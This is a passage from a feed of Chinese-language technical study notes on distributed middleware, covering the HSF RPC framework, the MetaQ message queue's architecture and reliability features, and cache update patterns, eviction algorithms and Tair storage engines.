<p>从上图可以看到，服务提供方在启动后会向地址注册中心发布地址，服务消费方根据服务名向地址注册中心订阅服务地址，当服务地址推送到服务消费方后，服务消费方就可以从地址列表中选择一个地址发起RPC调用。</p>
<p>服务提供方在发布地址的同时会将服务元信息发布到元数据存储中心，HSF控制台通过访问元数据存储中心向使用者展示服务的详情，同时HSF控制台还可以通过持久化配置中心和地址注册中心客户端查询服务信息和规则信息。</p>
<h3 id="模块" tabindex="-1"> 模块</h3>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-19-15-26-46.png" alt="" loading="lazy"></p>
<ul>
<li>地址注册中心：ConfigServer可以理解为一个IP地址的管理中心，它负责向消费者用户来推送服务端的地址，所以开发人员只需自己配置消费端或者服务端的地址就好。<strong>服务端和客户端都会跟CS建立长连接，并且通过心跳包进行维持</strong>。</li>
<li>配置中心：对于分布式服务，客户端如何调用实现负载均衡。规则配置中心Diamond，就是用于存放HSF的各种规则，是一个持久化的配置中心，这里客户端是主动从Diamond上进行拉取配置，并且注册了Listener，当路由规则变化时，Diamond会将新的规则重新推送给客户端，所以，客户端不需要与Diamond保持长连接。</li>
<li>容器pandora：pandora是HSF的基础容器，用于管理整个HSF的生命周期和二方包的隔离，同时，其他的几个中间件，configServer和Diamond也在pandora容器中。</li>
</ul>
<h3 id="内部框架" tabindex="-1"> 内部框架</h3>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-17-11.png" alt="" loading="lazy"></p>
<p>这4块领域从下到上，分别是：框架、应用、服务和配置。框架提供了基础功能，负责通信、线程、协议、序列化以及编解码相关的工作，它们提供了良好的抽象，框架之上的域只需要基于这些抽象就能完成一次高性能的调用。</p>
<p>应用主要面向服务框架的注册和发现过程，是HSF完成分布式调用的基础，它用来支撑服务。服务的粒度比应用小，它包含了调用链路、地址路由以及负载均衡等功能。在服务之上是配置，用户使用API来对各层进行配置，并生成调用的代理或暴露服务。</p>
<p>沿着客户端配置链路可以看到，用户配置了调用的接口、版本以及分组后，可以指定负载均衡策略、注册中心类型以及支持何种协议，当配置完成后，就可以生成客户端代理，开始远程调用了。服务端配置有所不同，除了配置注册中心以外，还可以配置序列化方式以及线程池，这些都会影响服务端的服务能力。</p>
<p>服务注册发现链路比较简单，它们贯穿在协议流程中，负责注册地址或者订阅服务。</p>
<p>调用链路从客户端发起调用开始，经历了客户端的选址和负载均衡后，将参数对象完成序列化，经过框架协议编码后，通过网络层发送出去。服务端接受到数据后进行解码，解码获得的二进制协议派发到服务端线程完成反序列化，生成出参数对象，最终完成反射调用。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-17-16-49-26.png" alt="" loading="lazy"></p>
<h3 id="调用方式" tabindex="-1"> 调用方式</h3>
<ul>
<li>同步实时调用：HSF的IO操作都是异步的，这里的同步其本质是做future.get(timeout)在这个点等待服务端的返回</li>
<li>Future异步调用</li>
<li>Callback异步调用（客户端需提供回调方法）</li>
<li>Generic调用（不依赖二方包，通过传入方法名，方法签名和参数值的方式调用服务）</li>
<li>服务端async调用（应用将通过AsyncContext写响应）</li>
<li>HTTP调用HSF(从2.1.1.6版本开始)</li>
</ul>
<p>此外Node， C++都是可以使用HSF的</p>
<h4 id="兼容调用" tabindex="-1"> 兼容调用</h4>
<p>一次远程服务调用都要经过代理层，协议层和IO层，其中在协议层，会根据服务提供者支持的协议选择不同的协议进行通信，如果服务提供者是DUBBO，那么就会根据其支持的协议选择DUBBO1或者DUBBO2协议进行传输，上层服务调用者不会感知到任何不同。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-19-15-27-47.png" alt="" loading="lazy"></p>
<h3 id="负载体系" tabindex="-1"> 负载体系</h3>
<p>HSF消费者启动的时候，会向ConfigServer注册自己订阅的服务信息，然后CS会将该服务的所有提供者IP推送给客户端，这时客户端就会根据从配置中心Diamond上拉下的规则对这些IP进行分类组装，然后返回给Consumer去随机调用，实现软负载的功能。规则的发布都可以在hsfops平台统一发布。</p>
<ol>
<li>路由规则：优先级是参数级路由 &gt; 方法级路由 &gt; 接口级路由</li>
<li>归组规则：每个应用唯一的一个归组，只有相同归组的服务（group）才能调用，对于发布了同一HSF服务的所有机器的一个分组。（如果不清楚，一般不要配置）。</li>
<li>同机房优先规则：HSF机房流量控制规则用于对跨机房间的HSF调用流量进行规划控制，能够保证HSF服务消费者在请求HSF服务时，优先选择与服务消费者同机房的服务提供者。同机房规则默认是关闭的。同样在ops上配置。有3个规则属性：</li>
</ol>
<ul>
<li>localPreferredSwitch： on|off</li>
<li>threshold： float值，生效阀值的计算方法：服务可用比例=本机房可用机器数量/服务所有机房的机器总量当服务可用比例&gt;=threshold时，启用本地机房优先策略当服务可用比例小于threshold时，本地机房优先策略关闭，服务仍然采用随机调用的方式</li>
<li>exclusions：如果期望该规则只对一部分机器生效，可以使用这一属性配置需要排除的IP，比如：172.24.*,将表示该规则不会应用于所有172.24打头的IP。</li>
</ul>
<ol start="4">
<li>权重规则：使用场景一般是压测或者机器的配置不均衡。</li>
</ol>
<h2 id="dubbo" tabindex="-1"> Dubbo</h2>
<p><a href="/notes/%E6%A1%86%E6%9E%B6/Dubbo.md" target="_blank" rel="noopener noreferrer">Dubbo详细内容</a></p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">MetaQ</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E6%B6%88%E6%81%AF.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E6%B6%88%E6%81%AF.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li></li>
</ul>

<p>分布式消息的主要目的是：解耦、滑峰填谷，保证最终一致性</p>
<h1 id="metaq" tabindex="-1"> MetaQ</h1>
<p>MetaQ是一款分布式、队列模型的消息中间件。分为Topic与Queue两种模式，Push（后台轮询pull）和Pull两种方式消费，支持严格的消息顺序，亿级别的堆积能力（超过后订阅消息吞吐量会下降），支持消息回溯（基于时间的回溯消费，）和多个维度的消息查询。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-23-25.png" alt="" loading="lazy"></p>
<h2 id="应用场景" tabindex="-1"> 应用场景</h2>
<ul>
<li>填⾕削峰，如聚⽯塔消息推送</li>
<li>和精卫配合做binlog同步、异步分发，TC、IC、UIC、彩票等</li>
<li>订单类应⽤，如⼩微⾦融的基⾦理财、阿⾥云官⽹售卖虚拟机等</li>
<li>流计算类应⽤，⽐如实时直播间</li>
<li>IM等实时消息领域，如钉钉的消息总线</li>
<li>⼴播⽅式cache同步</li>
</ul>
<h2 id="架构" tabindex="-1"> 架构</h2>
<h3 id="消息模型" tabindex="-1"> 消息模型</h3>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-23-59.png" alt="" loading="lazy"></p>
<ul>
<li>Producer：消息生产者，负责产生消息并发送消息到meta服务器</li>
<li>Consumer：消息消费者，负责消费消息，一般是后台系统负责异步消费。</li>
<li>Broker：Metaq的服务器</li>
<li>Topic：消息的主题,由用户定义并在服务端配置</li>
<li>Message：在生产者，消费者，服务器间传递的消息</li>
<li>Group：组名，一类Producer/Consumer的集合名称，通常称为Producer/Consumer集群</li>
<li>Offset：消息在服务器上的每个分区都是组织成一个文件列表,消费者拉取数据需要知道数据在文件中的偏移量,这个偏移量就是所谓的offset。</li>
</ul>
<h3 id="物理模型" tabindex="-1"> 物理模型</h3>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-24-53.png" alt="" loading="lazy"></p>
<p>各组件功能为：</p>
<ul>
<li>Name Server：注册服务器，Name Server 是一个几乎无状态节点，可集群部署，节点之间无任何信息同步。name server保存topic与broker集群的对应关系，决定哪个topic路由到哪个broker集群。在broker 注册topic信息的时候，写入所有节点。</li>
<li>Broker：存储转发服务器，每个broker需要与所有的name server建立长连接，从而获取topic信息；分为master和容灾的slaver，Master 与Slave 的对应关系通过指定相同的BrokerName，不同BrokerId 来定义</li>
<li>Producer：消息发送方，需要与其中一个name server建立连接，获得路由信息，再与主题对应的broker建立长连接且定时向master发送心跳；消息由producer发送到master，再由master同步到所有broker</li>
<li>Consumer：消息接收方，需要与其中一个name server建立连接，获得路由信息，再向提供服务的master、slaver建立长连接，具体接收消息时刻选择broker</li>
</ul>
<h3 id="存储结构" tabindex="-1"> 存储结构</h3>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-26-02.png" alt="" loading="lazy"></p>
<p>物理队列只有一个，采用固定大小的文件顺序存储消息。逻辑队列有多个，每个逻辑队列有多个分区，每个分区有多个索引。</p>
<p>a.消息顺序写入物理文件里面，每个文件达到一定的大小，新建一个文件继续顺序写数据（消息的写入是串行的，避免了磁盘竞争）。</p>
<p>b.消息的索引则顺序的写入逻辑文件中，并不存放真正的消息，只是存放指向消息的索引。 metaq对于客户端展现的是逻辑队列就是消费队列，consumer从消费队列里顺序取消息进行消费。</p>
<p>这种设计是把物理和逻辑分离，消费队列更加轻量化。所以metaq可以支撑更多的消费队列数，提升消息的吞吐量，并且有一定的消息堆积能力。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-17-16-05-40.png" alt="" loading="lazy"></p>
<p>缺点 ： 写虽然是顺序写，但是读却是随机读的 解决办法 ：尽可能让读命中pageCache，减少磁盘IO次数， metaq的所有消息都是持久化的，先写入系统PAGECACHE（页高速缓存），然后刷盘，可以保证内存与磁盘都有一份数据，访问时，直接从内存读取。 刷盘策略分为异步和同步两种。</p>
<h3 id="整体存储结构" tabindex="-1"> 整体存储结构</h3>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-17-15-23-02.png" alt="" loading="lazy"></p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-19-15-59-39.png" alt="" loading="lazy"></p>
<h4 id="index结构" tabindex="-1"> index结构</h4>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-19-16-22-22.png" alt="" loading="lazy"></p>
<p>Header：记录落Broker时间戳、偏移量，槽位数目和索引个数</p>
<p>SlotTable：数组插槽，插槽位置 = key的Hash值 % 插槽数量，每个槽位记录当前索引总数</p>
<p>Index Linked List：插槽后接的链表结构，记录key的Hash值、物理偏移地址、落盘时间和哈希冲突后上一个索引地址</p>
<ul>
<li>通过MessageKey检索消息：通过key定位slot，加锁从最大索引值开始倒序查找，比对hash值和落盘时间，返回一致时的物理偏移地址。</li>
</ul>
<h2 id="组件" tabindex="-1"> 组件</h2>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-17-16-40-20.png" alt="" loading="lazy"></p>
<h3 id="broker" tabindex="-1"> broker</h3>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-17-16-34-37.png" alt="" loading="lazy"></p>
<h4 id="负载均衡" tabindex="-1"> 负载均衡</h4>
<ul>
<li>一个topic分布在多个broker上，一个broker可以配置多个topic，它们是多对多的关系。</li>
<li>如果某个topic消息量很大，应该给它多配置几个队列，并且尽量多分布在不同broker上，减轻某个broker的压力。</li>
<li>topic消息量都比较均匀的情况下，如果某个broker上的队列越多，则该broker压力越大。</li>
</ul>
<h4 id="可用性" tabindex="-1"> 可用性</h4>
<p>由于消息分布在各个broker上，一旦某个broker宕机，则该broker上的消息读写都会受到影响。所以rocketmq提供了master/slave的结构，salve定时从master同步数据，如果master宕机，则slave提供消费服务，但是不能写入消息，此过程对应用透明，由rocketmq内部解决。</p>
<ul>
<li>一旦某个broker master宕机，生产者和消费者多久才能发现？受限于rocketmq的网络连接机制，默认情况下，最多需要30秒，但这个时间可由应用设定参数来缩短时间。这个时间段内，发往该broker的消息都是失败的，而且该broker的消息无法消费，因为此时消费者不知道该broker已经挂掉。</li>
<li>消费者得到master宕机通知后，转向slave消费，但是slave不能保证master的消息100%都同步过来了，因此会有少量的消息丢失。但是消息最终不会丢的，一旦master恢复，未同步过去的消息会被消费掉。</li>
</ul>
<h2 id="特性" tabindex="-1"> 特性</h2>
<h3 id="消息的可靠性保证" tabindex="-1"> 消息的可靠性保证</h3>
<p>一个消息从发送端应用，到消费端应用，中间有三个过程需要保证消息的可靠性。</p>
<p>1.发送端发消息</p>
<p>消息生产者发送消息后返回SendResult，如果isSuccess返回为true,则表示消息已经确认发送到服务器并被服务器接收存储。整个发送过程是一个同步的过程。保证消息送达服务器并返回结果。 只有当消息中间件及时明确的返回成功，才能确认消息可靠到达消息中间件。</p>
<p>2.消息中间件把消息存储起来</p>
<p>metaq服务器收到消息后首先把消息存放在磁盘文件中，确保持久存储，写入成功之后返回应答给发布者。因此，可以确认每条发送结果为成功的消息服务器都是写入磁盘的。 内存中内容属于非持久数据，会在断电之后丢失。</p>
<p>刷盘方式有同步双写和异步复制：</p>
<ul>
<li>同步双写：主备都刷盘完成才返回成功，能够保证数据的完全可靠性，但是目前主备不能自动切换，还需要手动切换，所以，还可能有部分数据丢失（切换中的数据）。</li>
<li>异步复制：异步的同步两个主备磁盘，可以保证数据的99%的不丢，但是当主异常时候，可能会有部分数据没有异步复制完成，导致少量数据丢失。broker slave启动一个线程，不断从master拉取数据，然后异步构建consume queue数据结构。</li>
</ul>
<p>3.消费端消费消息</p>
<p>消费者是一条接着一条地顺序消费消息，只有在成功消费一条消息后才会接着消费下一条。 如果在消费某条消息失败（如异常），则会尝试重试消费这条消息（默认最大5次），超过最大次数后仍然无法消费，则将消息存储在消费者的本地磁盘，由后台线程继续做重试。而主线程继续往后走，消费后续的消息。。由此来保证消息的可靠消费。</p>
<h3 id="消息发布" tabindex="-1"> 消息发布</h3>
<ol>
<li>消息生产者发送消息后返回SendResult，如果isSuccess返回为true,则表示消息已经确认发送到服务器并被服务器接收存储。整个发送过程是一个同步的过程。保证消息送达服务器并返回结果。 只有当消息中间件及时明确的返回成功，才能确认消息可靠到达消息中间件。</li>
<li>发送消息时，如果订阅方有过滤需求，请在消息Tag属性上设置相关值，Tag的名称不需要申请，可自由设置，一条消息只允许设置一个Tag。</li>
</ol>
<h3 id="消息订阅" tabindex="-1"> 消息订阅</h3>
<ol>
<li>非顺序消息消费，耗时时间不做限制，但是应用应该尽可能保证耗时短，这样才能达到高性能，另外消费消息Hang住，会导致消息所在队列的消费动作暂停，直到Hang住的消息消费完。对其他队列不受影响</li>
<li>顺序消息消费，耗时时间有限制，要保证每条消息在30s内消费完，超过30s会有潜在的乱序问题。（原因是分布式锁超时问题，但概率极低）</li>
<li>消费方式：
<ul>
<li>集群消费，一条消息只会被同一个group里一个消费端消费。不同group之间相互不影响。</li>
<li>广播消费，一条消息会被同一个group里每一个消费端消费。</li>
</ul>
</li>
<li>消息堆积：MetaQ每台服务器提供大约亿级的消息堆积能力（多个业务方共用），超过堆积阀值，订阅消息吞吐量会下降。</li>
</ol>
<h3 id="顺序消息" tabindex="-1"> 顺序消息</h3>
<p>普通顺序消息：正常情况下保证完全的消息顺序，一旦异常，broker重启，由于队列总数发生变化，哈希取模后定位的队列会变化，产生短暂的消息顺序不一致。</p>
<p>严格顺序消息：无论正常异常情况都能保证顺序，但是牺牲了分布式Failover （分布式异常回复机制）特性，即Broker 集群中只要有一台机器不可用，则整个集群都不可用，服务可用性大大降低。无论正常异常情况都能保证顺序，但是牺牲了分布式Failover 特性，即Broker 集群中只要有一台机器不可用，则整个集群都不可用，服务可用性大大降低。</p>
<h3 id="消息过滤" tabindex="-1"> 消息过滤</h3>
<p>在Broker 中，按照Consumer 的要求做过滤，优点是减少了对于Consumer 无用消息的网络传输。缺点是增加了Broker 的负担，实现相对复杂。Notify 支持多种过滤方式，包含直接按照消息类型过滤，灵活的语法表达式过滤，几乎可以满足最苛刻的过滤需求。metaq 支持按照简单的Message Tag 过滤，也支持按照Message Header、body 进行过滤。</p>
<h3 id="消息重试" tabindex="-1"> 消息重试</h3>
<ol>
<li>非顺序消息消费失败重试，消费失败的消息发回服务器，应用可以指定这条失败消息下次到达Consumer的时间。消费失败重试次数有限制，通常线上为每个订阅组每条失败消息重试5次（每次消息都会定时重试，定时时间随着重试次数递增，此过程应用可干预）。超过重试次数，消息进入死信队列，并向用户报警。</li>
<li>顺序消息消费失败重试，某个队列正在消费的消息消费失败，会将当前队列挂起（挂起时间应用可通过API设置），其他队列仍然正常消费。</li>
</ol>
<h3 id="消息重复性" tabindex="-1"> 消息重复性</h3>
<p>MetaQ不能保证消息不重复</p>
<ul>
<li>发送消息阶段，会存在分布式环境下典型的超时问题，即发送消息阶段不能保证消息不重复。</li>
<li>订阅消息阶段，由于涉及集群订阅，多个订阅者需要Rebalance方式订阅，在Rebalance短暂不一致情况下，会产生消息重复</li>
<li>订阅者意外宕机，消费进度未及时存储，也会产生消息重复</li>
</ul>
<p>解决</p>
<ul>
<li>应用方收到消息后，可通过Tair、DB等去重</li>
<li>应用方可通过主动拉的方式，可保证拉消息绝对不重复，但是分布式协调分配队列问题需要应用来控制</li>
</ul>
<h2 id="通信" tabindex="-1"> 通信</h2>
<h3 id="通信方式" tabindex="-1"> 通信方式</h3>
<p>同步(sync)
异步(async)
单向(oneway)</p>
<h3 id="reactor多线程" tabindex="-1"> Reactor多线程</h3>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-19-16-03-32.png" alt="" loading="lazy"></p>
<p>一个 Reactor 主线程（eventLoopGroupBoss，即为上面的1）负责监听 TCP网络连接请求，建立好连接后丢给Reactor 线程池（eventLoopGroupSelector，即为上面的“N”，源码中默认设置为3），它负责将建立好连接的socket 注册到 selector上去（RocketMQ的源码中会自动根据OS的类型选择NIO和Epoll，也可以通过参数配置），然后监听真正的网络数据。拿到网络数据后，再丢给Worker线程池（defaultEventExecutorGroup，即为上面的“M1”，源码中默认设置为8）。</p>
<p>为了更为高效的处理RPC的网络请求，这里的Worker线程池是专门用于处理Netty网络通信相关的（包括编码/解码、空闲链接管理、网络连接管理以及网络请求处理）。而处理业务操作放在业务线程池中执行（在NettyServerHandler中，对接收到的请求数据处理），根据 RomotingCommand 的业务请求码code去processorTable这个本地缓存变量中找到对应的 processor，然后封装成task任务后，提交给对应的业务processor处理线程池来执行（sendMessageExecutor，以发送消息为例，即为上面的 “M2”）。</p>
<table>
<thead>
<tr>
<th>线程数</th>
<th>线程名</th>
<th>线程具体说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>NettyBoss_%d</td>
<td>Reactor 主线程</td>
</tr>
<tr>
<td>N</td>
<td>NettyServerEPOLLSelector_%d_%d</td>
<td>Reactor 线程池</td>
</tr>
<tr>
<td>M1</td>
<td>NettyServerCodecThread_%d</td>
<td>Worker线程池</td>
</tr>
<tr>
<td>M2</td>
<td>RemotingExecutorThread_%d</td>
<td>业务processor处理线程池</td>
</tr>
</tbody>
</table>
<h2 id="事务消息" tabindex="-1"> 事务消息</h2>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-19-16-34-31.png" alt="" loading="lazy"></p>
<ol>
<li>事务消息与普通消息的区别就在于消息生产环节，生产者首先预发送一条消息到MQ(这也被称为发送half消息)</li>
<li>MQ接受到消息后，先进行持久化，则存储中会新增一条状态为待发送的消息</li>
<li>然后返回ACK给消息生产者，此时MQ不会触发消息推送事件</li>
<li>生产者预发送消息成功后，执行本地事务</li>
<li>执行本地事务，执行完成后，发送执行结果给MQ</li>
<li>MQ会根据结果删除或者更新消息状态为可发送</li>
<li>如果消息状态更新为可发送，则MQ会push消息给消费者，后面消息的消费和普通消息是一样的</li>
</ol>
<p>局限性：
针对消息消费失败场景，如果是消息处理真的失败了，重试多次仍然失败，如消息消费依赖1-5业务系统，1，2，3，4执行成功，5失败，此时，为了保证一致性，如果直接回滚1-4的操作，复杂度太高。目前这里的处理主要是补偿策略和对账。</p>
<p>Metaq的存储结构是文件记录形式，通过Offset递增进行访问数据，缺乏KV存储具有的update能力，如果要支持事务，必须引入类似于KV存储的模块才可以。所以Metaq目前对分布式事务支持不好。</p>
<h1 id="消息队列对比" tabindex="-1"> 消息队列对比</h1>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">缓存更新模式</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E7%BC%93%E5%AD%98.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E7%BC%93%E5%AD%98.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>

<p>缓存我们知道分为本地缓存和分布式缓存，本地缓存是本机使用，随着本地计算机系统向分布式系统的扩展，在分布式计算领域中得到了广泛的应用，称为分布式缓存。</p>
<p>分布式缓存能够处理大量的动态数据，因此比较适合应用在Web 2.0时代中的社交网站等需要由用户生成内容的场景。从本地缓存扩展到分布式缓存后，关注重点从CPU、内存、缓存之间的数据传输速度差异也扩展到了业务系统、数据库、分布式缓存之间的数据传输速度差异。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-30-40.png" alt="" loading="lazy"></p>
<h1 id="缓存更新模式" tabindex="-1"> 缓存更新模式</h1>
<h2 id="cache-aside" tabindex="-1"> Cache Aside</h2>
<p>常用的缓存模式了，具体的流程是：</p>
<ul>
<li>失效：应用程序先从 cache 取数据，没有得到，则从数据库中取数据，成功后，放到缓存中。</li>
<li>命中：应用程序从 cache 中取数据，取到后返回。</li>
<li>更新：先把数据存到数据库中，成功后，再让缓存失效。</li>
</ul>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-15-45-40.png" alt="" loading="lazy"></p>
<h2 id="read-write-through-更新模式" tabindex="-1"> Read/Write Through 更新模式</h2>
<p>在上面的 Cache Aside 更新模式中，应用代码需要维护两个数据存储，一个是缓存（Cache），一个是数据库（Repository）。而在Read/Write Through 更新模式中，应用程序只需要维护缓存，数据库的维护工作由缓存代理了。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-15-46-38.png" alt="" loading="lazy"></p>
<ul>
<li>Read Through：Read Through 模式就是在查询操作中更新缓存，也就是说，当缓存失效的时候，Cache Aside 模式是由调用方负责把数据加载入缓存，而 Read Through 则用缓存服务自己来加载。</li>
<li>Write Through：Write Through 模式和 Read Through 相仿，不过是在更新数据时发生。当有数据更新的时候，如果没有命中缓存，直接更新数据库，然后返回。如果命中了缓存，则更新缓存，然后由缓存自己更新数据库（这是一个同步操作）。</li>
</ul>
<h2 id="write-behind-caching-更新模式" tabindex="-1"> Write Behind Caching 更新模式</h2>
<p>Write Behind Caching 更新模式就是在更新数据的时候，只更新缓存，不更新数据库，而我们的缓存会异步地批量更新数据库。这个设计的好处就是直接操作内存速度快。因为异步，Write Behind Caching 更新模式还可以合并对同一个数据的多次操作到数据库，所以性能的提高是相当可观的。</p>
<p>但其带来的问题是，数据不是强一致性的，而且可能会丢失。另外，Write Behind Caching 更新模式实现逻辑比较复杂，因为它需要确认有哪些数据是被更新了的，哪些数据需要刷到持久层上。只有在缓存需要失效的时候，才会把它真正持久起来。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-15-47-29.png" alt="" loading="lazy"></p>
<h2 id="总结" tabindex="-1"> 总结</h2>
<p>三种缓存模式的优缺点：</p>
<p>Cache Aside 更新模式实现起来比较简单，但是需要维护两个数据存储，一个是缓存（Cache），一个是数据库（Repository）。</p>
<p>Read/Write Through 更新模式只需要维护一个数据存储（缓存），但是实现起来要复杂一些。</p>
<p>Write Behind Caching 更新模式和Read/Write Through 更新模式类似，区别是Write Behind Caching 更新模式的数据持久化操作是异步的，但是Read/Write Through 更新模式的数据持久化操作是同步的。优点是直接操作内存速度快，多次操作可以合并持久化到数据库。缺点是数据可能会丢失，例如系统断电等。</p>
<p>缓存是通过牺牲强一致性来提高性能的。所以使用缓存提升性能，就是会有数据更新的延迟。这需要我们在设计时结合业务仔细思考是否适合用缓存。然后缓存一定要设置过期时间，这个时间太短太长都不好，太短的话请求可能会比较多的落到数据库上，这也意味着失去了缓存的优势。太长的话缓存中的脏数据会使系统长时间处于一个延迟的状态，而且系统中长时间没有人访问的数据一直存在内存中不过期，浪费内存。</p>
<h1 id="缓存淘汰算法" tabindex="-1"> 缓存淘汰算法</h1>
<p>缓存淘汰算法是指令的一个明细表，用于决定缓存系统中哪些数据应该被删去。</p>
<h2 id="最不经常使用算法-lfu" tabindex="-1"> 最不经常使用算法（LFU）</h2>
<p>这个缓存算法使用一个计数器来记录条目被访问的频率。通过使用LFU缓存算法，最低访问数的条目首先被移除。这个方法并不经常使用，因为它无法对一个拥有最初高访问率之后长时间没有被访问的条目缓存负责。</p>
<h2 id="最近最少使用算法-lru" tabindex="-1"> 最近最少使用算法（LRU）</h2>
<p>LRU（The Least Recently Used，最近最久未使用算法）是一种常见的缓存算法，在很多分布式缓存系统（如Redis, Memcached）中都有广泛使用。</p>
<p>这个缓存算法将最近使用的条目存放到靠近缓存顶部的位置。当一个新条目被访问时，LRU将它放置到缓存的顶部。当缓存达到极限时，较早之前访问的条目将从缓存底部开始被移除。这里会使用到昂贵的算法，而且它需要记录“年龄位”来精确显示条目是何时被访问的。此外，当一个LRU缓存算法删除某个条目后，“年龄位”将随其他条目发生改变。</p>
<h2 id="先进先出算法-fifo" tabindex="-1"> 先进先出算法（FIFO）</h2>
<p>FIFO是英文First In First Out 的缩写，是一种先进先出的数据缓存器，他与普通存储器的区别是没有外部读写地址线，这样使用起来非常简单，但缺点就是只能顺序写入数据，顺序的读出数据，其数据地址由内部读写指针自动加1完成，不能像普通存储器那样可以由地址线决定读取或写入某个指定的地址。</p>
<h1 id="tair" tabindex="-1"> Tair</h1>
<p>Tair是一个类似于map的key/value结构存储系统（也就是缓存系统），具备标准的特性是：高性能、高扩展、高可靠，也就是传说中的三高产品，支持分布式集群部署。官网说目前支持java和c这两个版本。</p>
<ul>
<li>高性能——基于高速缓存、内存或者ssd</li>
<li>高扩展——轻量中间件+三种数据引擎+负载均衡</li>
<li>高可用——各种容灾部署方式和解决方案</li>
</ul>
<h2 id="主要功能" tabindex="-1"> 主要功能：</h2>
<ul>
<li>数据库缓存——作为数据库与dao层之间的中间缓存，降低对后端数据库的访问压力，高速缓存能使得访问速度达到1ms级别，例如高频率的数据库查询；</li>
<li>临时数据存储——应用程序需要维护大量临时数据，将临时数据存储在mdb中，可以降低内存管理的开销，改进应用程序工作负载。例如：在分布式系统中，同一个用户的不同请求可能会发送到不同的服务器上，这时可以用mdb作为全局存储，用于保存Session数据、用户的Token、权限信息等数据。【通常将缓存和临时数据存储统称为“非持久化存储”】</li>
<li>持久化存储——此时类似于传统的数据库，将数据存入磁盘中做持久化存储，例如广告推荐类需要离线计算大量数据以及榜单的生成（注意：由于此时采用的数据库引擎ldb是NoSQL类型的，所以不支持sql查询）</li>
</ul>
<h2 id="架构" tabindex="-1"> 架构</h2>
<h3 id="物理架构" tabindex="-1"> 物理架构</h3>
<p>Tair是Master/Slave结构。Config Server管理Data Server节点、维护Data Server的状态信息；Data Server负责数据存储，按照Config Server的指示完成数据复制和迁移工作，并定时给Config Server发送心跳信息。Config Server是单点，采用一主一备的方式保证可靠性。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-37-50.png" alt="" loading="lazy"></p>
<h3 id="逻辑架构" tabindex="-1"> 逻辑架构</h3>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-38-17.png" alt="" loading="lazy"></p>
<h2 id="存储模式对比" tabindex="-1"> 存储模式对比</h2>
<table>
<thead>
<tr>
<th>名称</th>
<th>基于数据库</th>
<th>特点</th>
<th>适用场景</th>
</tr>
</thead>
<tbody>
<tr>
<td>MDB</td>
<td>Memcached</td>
<td>基于内存；仅支持k-v类型数据；不支持持久化</td>
<td>数据小而简单，读多（QPS 万以上）写少，且偶尔数据丢失不应该对业务产生较大影响；例如访问量显示，session manager等功能</td>
</tr>
<tr>
<td>RDB</td>
<td>Redis</td>
<td>基于内存；除了kv，还支持string, list, hash, set, sortedset等数据类型；</td>
<td>支持一定程度的持久化</td>
</tr>
<tr>
<td>LDB</td>
<td>LevelDB</td>
<td>基于ssd硬盘；仅支持k-v类型数据；支持持久化</td>
<td>数据简单，有持久化需求，且读写QPS较高（万级别）但存储数据较简单的应用场景；例如订单计数，库存记录等功能，更新非常频繁。</td>
</tr>
</tbody>
</table>
